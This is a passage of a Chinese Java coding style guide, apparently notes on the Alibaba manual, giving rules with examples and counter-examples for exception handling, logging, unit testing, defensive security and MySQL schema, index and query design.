color=\"#76923C\">【参考】</font>错误码有利于不同文化背景的开发者进行交流与代码协作。 \n\n   <font color=\" #977C00\">说明：</font>英文单词形式的错误码不利于非英语母语国家（如阿拉伯语、希伯来语、俄罗斯语等）之间的开发 者互相协作。 \n\n13. <font color=\"#76923C\">【参考】</font>错误码即人性，感性认知+口口相传，使用纯数字来进行错误码编排不利于感性记忆 和分类。 \n\n    <font color=\" #977C00\">说明：</font>数字是一个整体，每位数字的地位和含义是相同的。\n\n    <font color=\" #FF4500\">反例：</font>一个五位数字 12345，第 1 位是错误等级，第 2 位是错误来源，345 是编号，人的大脑不会主动地 拆开并分辨每位数字的不同含义。 \n\n## (二) 异常处理 \n\n1. <font color=\" #C00000\">【强制】</font>Java  类库中定义的可以通过预检查方式规避的 RuntimeException 异常不应该通过 catch  的方式来处理，比如：NullPointerException，IndexOutOfBoundsException 等等。 \n\n   <font color=\" #977C00\">说明：</font>无法通过预检查的异常除外，比如，在解析字符串形式的数字时，可能存在数字格式错误，不得不通过 catch NumberFormatException 来实现。\n\n    <font color=\"#019858\">正例：</font>if (obj != null) {...} \n\n   <font color=\" #FF4500\">反例：</font>try { obj.method(); } catch (NullPointerException e) {…}\n\n2. <font color=\" #C00000\">【强制】</font>异常捕获后不要用来做流程控制，条件控制。    \n\n   <font color=\" #977C00\">说明：</font>异常设计的初衷是解决程序运行中的各种意外情况，且异常的处理效率比条件判断方式要低很多。\n\n3. <font color=\" #C00000\">【强制】</font>catch 时请分清稳定代码和非稳定代码，稳定代码指的是无论如何不会出错的代码。 对于非稳定代码的 catch 尽可能进行区分异常类型，再做对应的异常处理。    \n\n   <font color=\" #977C00\">说明：</font>对大段代码进行 try-catch，使程序无法根据不同的异常做出正确的应激反应，也不利于定位问题， 这是一种不负责任的表现。     \n\n   <font color=\"#019858\">正例：</font>用户注册的场景中，如果用户输入非法字符，或用户名称已存在，或用户输入密码过于简单，在程序上作出分门别类的判断，并提示给用户。\n\n4. <font color=\" #C00000\">【强制】</font>==捕获异常是为了处理它，不要捕获了却什么都不处理而抛弃之，如果不想处理它，请将该异常抛给它的调用者。最外层的业务使用者，必须处理异常，将其转化为用户可以理解的内容==。 \n\n5. <font color=\" #C00000\">【强制】</font>事务场景中，抛出异常被 catch 后，如果需要回滚，一定要注意手动回滚事务。\n\n6. <font color=\" #C00000\">【强制】</font>finally 块必须对资源对象、流对象进行关闭，有异常也要做 try-catch。 \n\n   <font color=\" #977C00\">说明：</font>如果 JDK7 及以上，可以使用 try-with-resources 方式。\n\n7. <font color=\" #C00000\">【强制】</font>不要在 finally 块中使用 return。 \n\n   <font color=\" #977C00\">说明：</font>try 块中的 return 语句执行成功后，并不马上返回，而是继续执行 finally 块中的语句，如果此处存 在 return 语句，则在此直接返回，无情丢弃掉 try 块中的返回点。\n\n   <font color=\" #FF4500\">反例：</font>\n\n   ```java\n   private int x = 0;\n   public int checkReturn() {\n       try {\n           // x 等于 1，此处不返回\n           return ++x;\n       } finally {\n           //  返回的结果是 2\n           return ++x;\n       }\n   }\n   ```\n\n8. <font color=\" #C00000\">【强制】</font>捕获异常与抛异常，必须是完全匹配，或者捕获异常是抛异常的父类。\n\n   <font color=\" #977C00\">说明：</font>如果预期对方抛的是绣球，实际接到的是铅球，就会产生意外情况。\n\n9. <font color=\" #C00000\">【强制】</font>==在调用 RPC、二方包、或动态生成类的相关方法时，捕捉异常必须使用 Throwable 类来进行拦截==。\n\n   <font color=\" #977C00\">说明：</font>通过反射机制来调用方法，如果找不到方法，抛出 NoSuchMethodException。什么情况会抛出 NoSuchMethodError 呢？二方包在类冲突时，仲裁机制可能导致引入非预期的版本使类的方法签名不匹配， 或者在字节码修改框架（比如：ASM）动态创建或修改类时，修改了相应的方法签名。这些情况，即使代码编译期是正确的，但在代码运行期时，会抛出 NoSuchMethodError。 \n\n10. <font color=\" #FFC000\">【推荐】</font>方法的返回值可以为 null，不强制返回空集合，或者空对象等，必须添加注释充分说明什么情况下会返回 null 值。 \n\n    <font color=\" #977C00\">说明：</font>本手册明确防止 NPE 是调用者的责任。即使被调用方法返回空集合或者空对象，对调用者来说，也并非高枕无忧，必须考虑到远程调用失败、序列化失败、运行时异常等场景返回 null 的情况。\n\n11. <font color=\" #FFC000\">【推荐】</font>防止 NPE，是程序员的基本修养，注意 NPE 产生的场景：\n\n    1）  返回类型为基本数据类型，return 包装数据类型的对象时，自动拆箱有可能产生 NPE。         \n\n    <font color=\" #FF4500\">反例：</font>public int f() { return Integer 对象}，  如果为 null，自动解箱抛 NPE。 \n\n    2）  数据库的查询结果可能为 null。 \n\n    3）  集合里的元素即使 isNotEmpty，取出的数据元素也可能为 null。 \n\n    4）  远程调用返回对象时，一律要求进行空指针判断，防止 NPE。 \n\n    5）  对于 Session 中获取的数据，建议进行 NPE 检查，避免空指针。\n\n    6）  级联调用 obj.getA().getB().getC()；一连串调用，易产生 NPE。 \n\n    <font color=\"#019858\">正例：</font>使用 JDK8 的 Optional 类来防止 NPE 问题。 \n\n12. <font color=\" #FFC000\">【推荐】</font>定义时区分 unchecked / checked  异常，避免直接抛出 new RuntimeException()， 更不允许抛出 Exception 或者 Throwable，应使用有业务含义的自定义异常。推荐业界已定义过的自定义异常，如：DAOException / ServiceException 等。 \n\n13. <font color=\"#76923C\">【参考】</font>对于公司外的 http/api 开放接口必须使用 errorCode；应用内部推荐异常抛出；跨应用间 RPC 调用优先考虑使用 Result 方式，封装 isSuccess()方法、errorCode、 errorMessage；\n\n    <font color=\" #977C00\">说明：</font>关于 RPC 方法返回方式使用 Result 方式的理由：\n\n    1）使用抛异常返回方式，调用方如果没有捕获到就会产生运行时错误。\n\n    2）如果不加栈信息，只是 new 自定义异常，加入自己的理解的 error message，对于调用端解决问题 的帮助不会太多。如果加了栈信息，在频繁调用出错的情况下，数据序列化和传输的性能损耗也是问题。\n\n## (三) 日志规约 \n\n1. <font color=\" #C00000\">【强制】</font>应用中不可直接使用日志系统（Log4j、Logback）中的 API，而应依赖使用日志框架（SLF4J、JCL--Jakarta Commons Logging）中的 API，使用门面模式的日志框架，有利于维护和 各个类的日志处理方式统一。\n\n   <font color=\" #977C00\">说明：</font>日志框架（SLF4J、JCL--Jakarta Commons Logging）的使用方式（推荐使用 SLF4J） \n\n   ```java\n   使用 SLF4J：\n   \n   import org.slf4j.Logger; \n   import org.slf4j.LoggerFactory; \n   private static final Logger logger = LoggerFactory.getLogger(Test.class); \n   \n   使用 JCL： \n   import org.apache.commons.logging.Log; \n   import org.apache.commons.logging.LogFactory; \n   private static final Log log = LogFactory.getLog(Test.class); \n   ```\n\n   \n\n2. <font color=\" #C00000\">【强制】</font>所有日志文件至少保存 15 天，因为有些异常具备以“周”为频次发生的特点。对于当天日志，以`应用名.log`来保存，保存在/home/admin/应用名/logs/目录下，过往日志 格式为: {logname}.log.{保存日期}，日期格式：yyyy-MM-dd \n\n   <font color=\"#019858\">正例：</font>以 aap 应用为例，日志保存在/home/admin/aapserver/logs/aap.log，历史日志名称为 aap.log.2016-08-01 \n\n3. <font color=\" #C00000\">【强制】</font>根据国家法律，网络运行状态、网络安全事件、个人敏感信息操作等相关记录，留存 的日志不少于六个月，并且进行网络多机备份。\n\n4. <font color=\" #C00000\">【强制】</font>应用中的扩展日志（如打点、临时监控、访问日志等）命名方式： appName\\_logType\\_logName.log。logType:日志类型，如 stats/monitor/access 等；logName:日志描述。这种命名的好处：通过文件名就可知道日志文件属于什么应用，什么类型，什么目的，也有利于归类查找。\n\n   <font color=\" #977C00\">说明：</font>推荐对日志进行分类，如将错误日志和业务日志分开存放，便于开发人员查看，也便于通过日志对系统进行及时监控。\n\n    <font color=\"#019858\">正例：</font>mppserver 应用中单独监控时区转换异常，如：mppserver\\_monitor\\_timeZoneConvert.log\n\n5. <font color=\" #C00000\">【强制】</font>在日志输出时，字符串变量之间的拼接使用占位符的方式。\n\n   <font color=\" #977C00\">说明：</font>因为 String 字符串的拼接会使用 StringBuilder 的 append()方式，有一定的性能损耗。使用占位符仅是替换动作，可以有效提升性能。\n\n    <font color=\"#019858\">正例：</font>logger.debug(\"Processing trade with id: {} and symbol: {}\", id, symbol);\n\n6. <font color=\" #C00000\">【强制】</font>对于 trace/debug/info 级别的日志输出，必须进行日志级别的开关判断。    \n\n   <font color=\" #977C00\">说明：</font>虽然在 debug(参数)的方法体内第一行代码 isDisabled(Level.DEBUG\\_INT)为真时（Slf4j 的常见实现 Log4j 和 Logback），就直接 return，但是参数可能会进行字符串拼接运算。此外，如果 debug(getName()) 这种参数内有 getName()方法调用，无谓浪费方法调用的开销。\n\n   <font color=\"#019858\">正例：</font>\n\n   ```java\n   //  如果判断为真，那么可以输出 trace 和 debug 级别的日志\n   if (logger.isDebugEnabled()) { \n       logger.debug(\"Current ID is: {} and name is: {}\", id, getName()); \n   } \n   ```\n\n7. <font color=\" #C00000\">【强制】</font>避免重复打印日志，浪费磁盘空间，务必在日志配置文件中设置 additivity=false。     \n\n   <font color=\"#019858\">正例：</font><logger name=\"com.taobao.dubbo.config\" additivity=\"false\"> \n\n8. <font color=\" #C00000\">【强制】</font>生产环境禁止直接使用 System.out  或 System.err  输出日志或使用 e.printStackTrace()打印异常堆栈。\n\n   <font color=\" #977C00\">说明：</font>标准日志输出与标准错误输出文件每次 Jboss 重启时才滚动，如果大量输出送往这两个文件，容易 造成文件大小超过操作系统大小限制。\n\n9. <font color=\" #C00000\">【强制】</font>异常信息应该包括两类信息：案发现场信息和异常堆栈信息。如果不处理，那么通过关键字 throws 往上抛出。\n\n   <font color=\"#019858\">正例：</font>logger.error(\"inputParams:{} and errorMessage:{}\",  各类参数或者对象toString(), e.getMessage(), e);\n\n10. <font color=\" #C00000\">【强制】</font>日志打印时禁止直接用 JSON 工具将对象转换成 String。\n\n    <font color=\" #977C00\">说明：</font>如果对象里某些 get 方法被覆写，存在抛出异常的情况，则可能会因为打印日志而影响正常业务流 程的执行。\n\n    <font color=\"#019858\">正例：</font>打印日志时仅打印出业务相关属性值或者调用其对象的 toString()方法。\n\n11. <font color=\" #FFC000\">【推荐】</font>谨慎地记录日志生产环境禁止输出 debug 日志；有选择地输出 info 日志；如果使用 warn 来记录刚上线时的业务行为信息，一定要注意日志输出量的问题，避免把服务器磁盘撑爆，并记得及时删除这些观察日志。    \n\n    <font color=\" #977C00\">说明：</font>大量地输出无效日志，不利于系统性能提升，也不利于快速定位错误点。记录日志时请思考：这些日志真的有人看吗？看到这条日志你能做什么？能不能给问题排查带来好处？\n\n12. <font color=\" #FFC000\">【推荐】</font>可以使用 warn 日志级别来记录用户输入参数错误的情况，避免用户投诉时，无所适从。如非必要，请不要在此场景打出 error 级别，避免频繁报警。\n\n    <font color=\" #977C00\">说明：</font>注意日志输出的级别，error 级别只记录系统逻辑出错、异常或者重要的错误信息。\n\n13. <font color=\" #FFC000\">【推荐】</font>尽量用英文来描述日志错误信息，如果日志中的错误信息用英文描述不清楚的话使用 中文描述即可，否则容易产生歧义。 \n\n    <font color=\" #977C00\">说明：</font>国际化团队或海外部署的服务器由于字符集问题，使用全英文来注释和描述日志错误信息。\n\n# 三、单元测试 \n\n1. <font color=\" #C00000\">【强制】</font>好的单元测试必须遵守 AIR原则。    \n\n   <font color=\" #977C00\">说明：</font>单元测试在线上运行时，感觉像空气（AIR）一样感觉不到，但在测试质量的保障上，却是非常关键 的。好的单元测试宏观上来说，具有自动化、独立性、可重复执行的特点。\n\n   - A：Automatic（自动化）\n   - I：Independent（独立性）\n   - R：Repeatable（可重复）\n\n2. <font color=\" #C00000\">【强制】</font>单元测试应该是全自动执行的，并且非交互式的。测试用例通常是被定期执行的，执行过程必须完全自动化才有意义。输出结果需要人工检查的测试不是一个好的单元测试。单元 测试中不准使用 System.out 来进行人肉验证，必须使用 assert 来验证。 \n\n3. <font color=\" #C00000\">【强制】</font>保持单元测试的独立性。为了保证单元测试稳定可靠且便于维护，单元测试用例之间决不能互相调用，也不能依赖执行的先后次序。\n\n   <font color=\" #FF4500\">反例：</font>method2 需要依赖 method1 的执行，将执行结果作为 method2 的输入。\n\n4. <font color=\" #C00000\">【强制】</font>单元测试是可以重复执行的，不能受到外界环境的影响。   \n\n   <font color=\" #977C00\">说明：</font>单元测试通常会被放到持续集成中，每次有代码 check in 时单元测试都会被执行。如果单测对外部环境（网络、服务、中间件等）有依赖，容易导致持续集成机制的不可用。     \n\n   <font color=\"#019858\">正例：</font>为了不受外界环境影响，要求设计代码时就把 SUT 的依赖改成注入，在测试时用 spring  这样的 DI 框架注入一个本地（内存）实现或者 Mock 实现。\n\n5. <font color=\" #C00000\">【强制】</font>对于单元测试，要保证测试粒度足够小，有助于精确定位问题。单测粒度至多是类级别，一般是方法级别。\n\n   <font color=\" #977C00\">说明：</font>只有测试粒度小才能在出错时尽快定位到出错位置。单测不负责检查跨类或者跨系统的交互逻辑， 那是集成测试的领域。\n\n6. <font color=\" #C00000\">【强制】</font>核心业务、核心应用、核心模块的增量代码确保单元测试通过。\n\n   <font color=\" #977C00\">说明：</font>新增代码及时补充单元测试，如果新增代码影响了原有单元测试，请及时修正。\n\n7. <font color=\" #C00000\">【强制】</font>单元测试代码必须写在如下工程目录：src/test/java，不允许写在业务代码目录下。    \n\n   <font color=\" #977C00\">说明：</font>源码编译时会跳过此目录，而单元测试框架默认是扫描此目录。\n\n8. <font color=\" #FFC000\">【推荐】</font>单元测试的基本目标：语句覆盖率达到 70%；核心模块的语句覆盖率和分支覆盖率都要达到 100%\n\n   <font color=\" #977C00\">说明：</font>在工程规约的应用分层中提到的 DAO 层，Manager层，可重用度高的 Service，都应该进行单元测 试。\n\n\n9. <font color=\" #FFC000\">【推荐】</font>编写单元测试代码遵守 BCDE原则，以保证被测试模块的交付质量。\n\n   - B：Border，边界值测试，包括循环边界、特殊取值、特殊时间点、数据顺序等。\n   - C：Correct，正确的输入，并得到预期的结果。\n   - D：Design，与设计文档相结合，来编写单元测试。\n   - E：Error，强制错误信息输入（如：非法数据、异常流程、业务允许外等），并得到预期的结果。\n\n10. <font color=\" #FFC000\">【推荐】</font>对于数据库相关的查询，更新，删除等操作，不能假设数据库里的数据是存在的，或者直接操作数据库把数据插入进去，请使用程序插入或者导入数据的方式来准备数据。    \n\n    <font color=\" #FF4500\">反例：</font>删除某一行数据的单元测试，在数据库中，先直接手动增加一行作为删除目标，但是这一行新增数 据并不符合业务插入规则，导致测试结果异常。 \n\n11. <font color=\" #FFC000\">【推荐】</font>和数据库相关的单元测试，可以设定自动回滚机制，不给数据库造成脏数据。或者对单元测试产生的数据有明确的前后缀标识。\n\n    <font color=\"#019858\">正例：</font>在阿里巴巴企业智能事业部的内部单元测试中，使用 ENTERPRISE\\_INTELLIGENCE \\_UNIT\\_TEST\\_ 的前缀来标识单元测试相关代码。\n\n12. <font color=\" #FFC000\">【推荐】</font>对于不可测的代码在适当的时机做必要的重构，使代码变得可测，避免为了达到测试要求而书写不规范测试代码。\n\n13. <font color=\" #FFC000\">【推荐】</font>在设计评审阶段，开发人员需要和测试人员一起确定单元测试范围，单元测试最好覆盖所有测试用例（UC）。 \n\n14. <font color=\" #FFC000\">【推荐】</font>单元测试作为一种质量保障手段，在项目提测前完成单元测试，不建议项目发布后补充单元测试用例。 \n\n15. <font color=\"#76923C\">【参考】</font>为了更方便地进行单元测试，业务代码应避免以下情况：\n\n    - 构造方法中做的事情过多。\n\n    - 存在过多的全局变量和静态方法。\n\n    - 存在过多的外部依赖。\n\n    - 存在过多的条件语句。\n\n    <font color=\" #977C00\">说明：</font>多层条件语句建议使用卫语句、策略模式、状态模式等方式重构。\n\n16. <font color=\"#76923C\">【参考】</font>不要对单元测试存在如下误解：\n\n    - 那是测试同学干的事情。本文是开发手册，凡是本文内容都是与开发同学强相关的。\n\n    - 单元测试代码是多余的。系统的整体功能与各单元部件的测试正常与否是强相关的。\n\n    - 单元测试代码不需要维护。一年半载后，那么单元测试几乎处于废弃状态。\n\n    - 单元测试与线上故障没有辩证关系。好的单元测试能够最大限度地规避线上故障。\n\n\n# 四、安全规约\n\n1. <font color=\" #C00000\">【强制】</font>隶属于用户个人的页面或者功能必须进行权限控制校验。\n\n   <font color=\" #977C00\">说明：</font>防止没有做水平权限校验就可随意访问、修改、删除别人的数据，比如查看他人的私信内容。\n\n2. <font color=\" #C00000\">【强制】</font>用户敏感数据禁止直接展示，必须对展示数据进行脱敏。    \n\n   <font color=\" #977C00\">说明：</font>中国大陆个人手机号码显示：139\\*\\*\\*\\*1219，隐藏中间 4 位，防止隐私泄露。\n\n3. <font color=\" #C00000\">【强制】</font>用户输入的 SQL 参数严格使用参数绑定或者 METADATA字段值限定，防止 SQL 注入， 禁止字符串拼接 SQL 访问数据库。\n\n   <font color=\" #FF4500\">反例：</font>某系统签名大量被恶意修改，即是因为对于危险字符  # --没有进行转义，导致数据库更新时，where 后边的信息被注释掉，对全库进行更新。\n\n4. <font color=\" #C00000\">【强制】</font>用户请求传入的任何参数必须做有效性验证。\n\n   <font color=\" #977C00\">说明：</font>忽略参数校验可能导致：\n\n   - page size 过大导致内存溢出\n\n   - 恶意 order by 导致数据库慢查询\n\n   - 缓存击穿 \n\n   - SSRF \n\n   - 任意重定向\n\n   - SQL 注入，Shell 注入，反序列化注入\n\n   - 正则输入源串拒绝服务 ReDoS \n\n   Java 代码用正则来验证客户端的输入，有些正则写法验证普通用户输入没有问题，但是如果攻击人员使用 的是特殊构造的字符串来验证，有可能导致死循环的结果。 \n\n5. <font color=\" #C00000\">【强制】</font>禁止向 HTML 页面输出未经安全过滤或未正确转义的用户数据。\n\n6. <font color=\" #C00000\">【强制】</font>表单、AJAX提交必须执行 CSRF 安全验证。 \n\n   <font color=\" #977C00\">说明：</font>CSRF(Cross-site request forgery)跨站请求伪造是一类常见编程漏洞。对于存在 CSRF 漏洞的应用/ 网站，攻击者可以事先构造好 URL，只要受害者用户一访问，后台便在用户不知情的情况下对数据库中用户参数进行相应修改。\n\n7. <font color=\" #C00000\">【强制】</font>URL外部重定向传入的目标地址必须执行白名单过滤。\n\n8. <font color=\" #C00000\">【强制】</font>在使用平台资源，譬如短信、邮件、电话、下单、支付，必须实现正确的防重放的机制，如数量限制、疲劳度控制、验证码校验，避免被滥刷而导致资损。 \n\n   <font color=\" #977C00\">说明：</font>如注册时发送验证码到手机，如果没有限制次数和频率，那么可以利用此功能骚扰到其它用户，并造成短信平台资源浪费。\n\n9. <font color=\" #FFC000\">【推荐】</font>发贴、评论、发送即时消息等用户生成内容的场景必须实现防刷、文本内容违禁词过滤等风控策略。\n\n# 五、MySQL 数据库\n\n## (一)  建表规约 \n\n1. <font color=\" #C00000\">【强制】</font>表达是与否概念的字段，必须使用 is\\_xxx 的方式命名，数据类型是 `unsigned tinyint` （1 表示是，0 表示否）。\n\n   <font color=\" #977C00\">说明：</font>任何字段如果为非负数，必须是 unsigned。 \n\n   注意：POJO 类中的任何布尔类型的变量，都不要加 is 前缀，所以，需要在<resultMap>设置从 is\\_xxx 到 Xxx的映射关系。数据库表示是与否的值，使用 tinyint 类型，坚持 is\\_xxx 的命名方式是为了明确其取值含 义与取值范围。\n\n   <font color=\"#019858\">正例：</font>表达逻辑删除的字段名 is\\_deleted，1 表示删除，0 表示未删除。\n\n2. <font color=\" #C00000\">【强制】</font>表名、字段名必须使用小写字母或数字，禁止出现数字开头，禁止两个下划线中间只出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑。\n\n   <font color=\" #977C00\">说明：</font>MySQL 在 Windows 下不区分大小写，但在 Linux 下默认是区分大小写。因此，数据库名、表名、 字段名，都不允许出现任何大写字母，避免节外生枝。\n\n   <font color=\"#019858\">正例：</font>aliyun\\_admin，rdc\\_config，level3\\_name \n\n   <font color=\" #FF4500\">反例：</font>AliyunAdmin，rdcConfig，level\\_3\\_name \n\n3. <font color=\" #C00000\">【强制】</font>表名不使用复数名词。\n\n   <font color=\" #977C00\">说明：</font>表名应该仅仅表示表里面的实体内容，不应该表示实体数量，对应于 DO 类名也是单数形式，符合表达习惯。\n\n4. <font color=\" #C00000\">【强制】</font>禁用保留字，如 desc、range、match、delayed 等，请参考 MySQL 官方保留字。 \n\n5. <font color=\" #C00000\">【强制】</font>主键索引名为 pk\\_字段名；唯一索引名为 uk\\_字段名；普通索引名则为 idx\\_字段名。  \n\n   <font color=\" #977C00\">说明：</font>pk\\_  即 primary key；uk\\_  即 unique key；idx\\_  即 index 的简称。 \n\n6. <font color=\" #C00000\">【强制】</font>小数类型为 decimal，禁止使用 float 和 double。 \n\n   <font color=\" #977C00\">说明：</font>在存储的时候，float  和 double  都存在精度损失的问题，很可能在比较值的时候，得到不正确的结果。如果存储的数据范围超过 decimal  的范围，建议将数据拆成整数和小数并分开存储。\n\n7. <font color=\" #C00000\">【强制】</font>如果存储的字符串长度几乎相等，使用 char 定长字符串类型。\n\n8. <font color=\" #C00000\">【强制】</font>varchar 是可变长字符串，不预先分配存储空间，长度不要超过 5000，如果存储长度 大于此值，定义字段类型为 text，独立出来一张表，用主键来对应，避免影响其它字段索引效 率。 \n\n9. <font color=\" #C00000\">【强制】</font>表必备三字段：id, create\\_time, update\\_time。 \n\n   <font color=\" #977C00\">说明：</font>其中 id 必为主键，类型为 bigint unsigned、单表时自增、步长为 1。create\\_time, update\\_time 的类型均为 datetime 类型，前者现在时表示主动式创建，后者过去分词表示被动式更新。\n\n\n10. <font color=\" #FFC000\">【推荐】</font>表的命名最好是遵循“业务名称\\_表的作用”。 \n\n    <font color=\"#019858\">正例：</font>alipay\\_task / force\\_project / trade\\_config\n\n11. <font color=\" #FFC000\">【推荐】</font>库名与应用名称尽量一致。\n\n12. <font color=\" #FFC000\">【推荐】</font>如果修改字段含义或对字段表示的状态追加时，需要及时更新字段注释。\n\n13. <font color=\" #FFC000\">【推荐】</font>字段允许适当冗余，以提高查询性能，但必须考虑数据一致。冗余字段应遵循：\n\n    - 不是频繁修改的字段。\n\n    - 不是唯一索引的字段。 \n    - 不是 varchar 超长字段，更不能是 text 字段。 \n\n    <font color=\"#019858\">正例：</font>各业务线经常冗余存储商品名称，避免查询时需要调用 IC 服务获取。\n\n14. <font color=\" #FFC000\">【推荐】</font>单表行数超过 500 万行或者单表容量超过 2GB，才推荐进行分库分表。\n\n    <font color=\" #977C00\">说明：</font>如果预计三年后的数据量根本达不到这个级别，请不要在创建表时就分库分表。\n\n15. <font color=\"#76923C\">【参考】</font>合适的字符存储长度，不但节约数据库表空间、节约索引存储，更重要的是提升检索 速度。 \n\n    <font color=\"#019858\">正例：</font>无符号值可以避免误存负数，且扩大了表示范围。\n\n    | 对象     | 年龄区间   | 类型              | 字节 | 表示范围                       |\n    | -------- | ---------- | ----------------- | ---- | ------------------------------ |\n    | 人       | 150 岁之内 | tinyint unsigned  | 1    | 无符号值：0 到 255             |\n    | 龟       | 数百岁     | smallint unsigned | 2    | 无符号值：0 到 65535           |\n    | 恐龙化石 | 数千万年   | int unsigned      | 4    | 无符号值：0 到约 43 亿         |\n    | 太阳     | 约 50 亿年 | bigint unsigned   | 8    | 无符号值：0 到约 10 的 19 次方 |\n\n## (二)  索引规约\n\n1. <font color=\" #C00000\">【强制】</font>业务上具有唯一特性的字段，即使是组合字段，也必须建成唯一索引。\n\n   <font color=\" #977C00\">说明：</font>不要以为唯一索引影响了 insert 速度，这个速度损耗可以忽略，但提高查找速度是明显的；另外， 即使在应用层做了非常完善的校验控制，只要没有唯一索引，根据墨菲定律，必然有脏数据产生。\n\n2. <font color=\" #C00000\">【强制】</font>超过三个表禁止 join。==需要 join 的字段，数据类型保持绝对一致==；多表关联查询时， 保证被关联的字段需要有索引。\n\n   <font color=\" #977C00\">说明：</font>即使双表 join 也要注意表索引、SQL 性能。\n\n3. <font color=\" #C00000\">【强制】</font>在 varchar 字段上建立索引时，必须指定索引长度，没必要对全字段建立索引，根据 实际文本区分度决定索引长度。\n\n   <font color=\" #977C00\">说明：</font>索引的长度与区分度是一对矛盾体，一般对字符串类型数据，长度为 20 的索引，区分度会高达 90% 以上，可以使用`count(distinct left(列名,  索引长度))/count(\\*)`的区分度来确定。\n\n4. <font color=\" #C00000\">【强制】</font>页面搜索严禁左模糊或者全模糊，如果需要请走搜索引擎来解决。\n\n   <font color=\" #977C00\">说明：</font>索引文件具有 B-Tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。\n\n\n5. <font color=\" #FFC000\">【推荐】</font>如果有order by的场景，请注意利用索引的有序性。order by 最后的字段是组合索引的一部分，并且放在索引组合顺序的最后，避免出现file_sort的情况，影响查询性能。\n\n   <font color=\"#019858\">正例：</font>where a=? and b=? order by c;  索引：a\\_b\\_c    \n\n   <font color=\" #FF4500\">反例：</font>索引如果存在范围查询，那么索引有序性无法利用，如： WHERE a>10 ORDER BY b; 索引a_b无法排序。\n\n\n6. <font color=\" #FFC000\">【推荐】</font>利用覆盖索引来进行查询操作，避免回表。 \n\n   <font color=\" #977C00\">说明：</font>如果一本书需要知道第 11 章是什么标题，会翻开第 11 章对应的那一页吗？目录浏览一下就好，这 个目录就是起到覆盖索引的作用。     \n\n   <font color=\"#019858\">正例：</font>能够建立索引的种类分为主键索引、唯一索引、普通索引三种，而覆盖索引只是一种查询的一种效 果，用 explain 的结果，extra 列会出现：using index。\n\n7. <font color=\" #FFC000\">【推荐】</font>利用延迟关联或者子查询优化超多分页场景。\n\n   <font color=\" #977C00\">说明：</font>MySQL 并不是跳过 offset 行，而是取 offset+N 行，然后返回放弃前 offset 行，返回 N 行，那当 offset 特别大的时候，效率就非常的低下，要么控制返回的总页数，要么对超过特定阈值的页数进行 SQL 改写。 \n\n    <font color=\"#019858\">正例：</font>先快速定位需要获取的 id 段，然后再关联：\n\n   ```sql\n   SELECT t1.* FROM  表 1 as t1, (select id from  表 1 where  条件  LIMIT 100000,20 ) as t2 where t1.id=t2.id\n   ```\n\n8. <font color=\" #FFC000\">【推荐】</font>SQL 性能优化的目标：至少要达到 range  级别，要求是 ref 级别，如果可以是 consts 最好。 \n\n   <font color=\" #977C00\">说明：</font> \n\n   - consts  单表中最多只有一个匹配行（主键或者唯一索引），在优化阶段即可读取到数据。\n\n   - ref  指的是使用普通的索引（normal index）。 \n\n   - range  对索引进行范围检索。\n\n   <font color=\" #FF4500\">反例：</font>explain 表的结果，type=index，索引物理文件全扫描，速度非常慢，这个 index 级别比较 range 还低，与全表扫描是小巫见大巫。\n\n9. <font color=\" #FFC000\">【推荐】</font>建组合索引的时候，区分度最高的在最左边。\n\n   <font color=\"#019858\">正例：</font>如果 where a=? and b=?，a 列的几乎接近于唯一值，那么只需要单建 idx\\_a 索引即可。    \n\n   <font color=\" #977C00\">说明：</font>存在非等号和等号混合判断条件时，在建索引时，请把等号条件的列前置。如：where c>? and d=? 那么即使 c 的区分度更高，也必须把 d 放在索引的最前列，即建立组合索引 idx\\_d\\_c。\n\n10. <font color=\" #FFC000\">【推荐】</font>防止因字段类型不同造成的隐式转换，导致索引失效。\n\n11. <font color=\"#76923C\">【参考】</font>创建索引时避免有如下极端误解：\n\n    - 索引宁滥勿缺。认为一个查询就需要建一个索引。\n\n    - 吝啬索引的创建。认为索引会消耗空间、严重拖慢记录的更新以及行的新增速度。  \n    - 抵制惟一索引。认为惟一索引一律需要在应用层通过“先查后插”方式解决。\n\n## (三)  SQL 语句 \n\n1. <font color=\" #C00000\">【强制】</font>不要使用 count(列名)或 count(常量)来替代 count(\\*)，count(\\*)是 SQL92 定义的标 准统计行数的语法，跟数据库无关，跟 NULL和非 NULL无关。 \n\n   <font color=\" #977C00\">说明：</font>==count(\\*)会统计值为 NULL的行，而 count(列名)不会统计此列为 NULL值的行==\n\n2. <font color=\" #C00000\">【强制】</font>count(distinct col)  计算该列除 NULL之外的不重复行数，注意  count(distinct col1, col2)  如果其中一列全为 NULL，那么即使另一列有不同的值，也返回为 0。 \n\n3. <font color=\" #C00000\">【强制】</font>当某一列的值全是 NULL时，count(col)的返回结果为 0，但 sum(col)的返回结果为 NULL，因此使用 sum()时需注意 NPE 问题。 \n\n   <font color=\"#019858\">正例：</font>可以使用如下方式来避免 sum 的 NPE 问题：`SELECT IFNULL(SUM(column), 0) FROM table`;\n\n4. <font color=\" #C00000\">【强制】</font>使用 ISNULL()来判断是否为 NULL值。 \n\n   <font color=\" #977C00\">说明：</font>==NULL与任何值的直接比较都为 NULL==。 \n\n    1）  <font color=\"#0000FF\">NULL<>NULL</font> 的返回结果是 NULL，而不是 false。 \n\n    2）  <font color=\"#0000FF\">NULL=NULL</font> 的返回结果是 NULL，而不是 true。 \n\n    3）  <font color=\"#0000FF\">NULL<>1</font> 的返回结果是 NULL，而不是 true。\n\n   <font color=\" #FF4500\">反例：</font>在 SQL 语句中，如果在 null 前换行，影响可读性。select \\* from table where column1 is null and column3 is not null;  而 ISNULL(column) 是一个整体，简洁易懂。从性能数据上分析， ISNULL(column) 执行效率更快一些。\n\n5. <font color=\" #C00000\">【强制】</font>代码中写分页查询逻辑时，若 count 为 0 应直接返回，避免执行后面的分页语句。\n\n6. <font color=\" #C00000\">【强制】</font>不得使用外键与级联，一切外键概念必须在应用层解决。\n\n   <font color=\" #977C00\">说明：</font>（概念解释）学生表中的 student\\_id 是主键，那么成绩表中的 student\\_id 则为外键。如果更新学生表中的 student\\_id，同时触发成绩表中的 student\\_id 更新，即为级联更新。\n\n   外键与级联更新适用于单机 低并发，不适合分布式、高并发集群；\n\n   级联更新是强阻塞，存在数据库更新风暴的风险；\n\n   外键影响数据库的插入速度。\n\n7. <font color=\" #C00000\">【强制】</font>禁止使用存储过程，存储过程难以调试和扩展，更没有移植性。\n\n8. <font color=\" #C00000\">【强制】</font>数据订正（特别是删除或修改记录操作）时，要先 select，避免出现误删除，确认无 误才能执行更新语句。 